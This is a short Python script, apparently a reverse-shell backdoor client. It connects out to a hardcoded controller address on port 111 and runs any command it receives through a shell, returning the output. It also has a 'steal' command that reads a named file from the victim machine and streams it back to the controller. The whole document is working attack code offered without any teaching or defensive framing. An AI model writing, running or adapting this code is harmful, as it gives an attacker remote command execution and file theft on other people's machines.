from socket import *
import subprocess
import os

def connect():
    server = socket(AF_INET, SOCK_STREAM)
    # server ip
    host = "192.168.1.8"
    port = 111
    buffer_size = 1024
    print("[+] Connecting to {}:{}".format(host, port))
    server.connect((host, port))
    print("[+] Connected!")

    while 1:
        command = server.recv(1024)
        command_decoded = command.decode("utf-8")
        if "terminate" in command_decoded:
            print("[!] Connection closed!")
            server.close()
            break
        elif "steal" in command_decoded:
            file_path = command_decoded.split(">")
            print("[+] Start!")
            with open(file_path[1], "rb") as f:
                while True:
                    file_bytes = f.read(buffer_size)
                    if not file_bytes:
                        break
                    server.send(file_bytes)
            end = "end-transfer-file".encode("ISO-8859-1")
            server.send(end)
            print("[+] End!")
        else:
            CMD = subprocess.Popen(command_decoded, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            server.send(CMD.stdout.read())

def main():
    connect()

main()
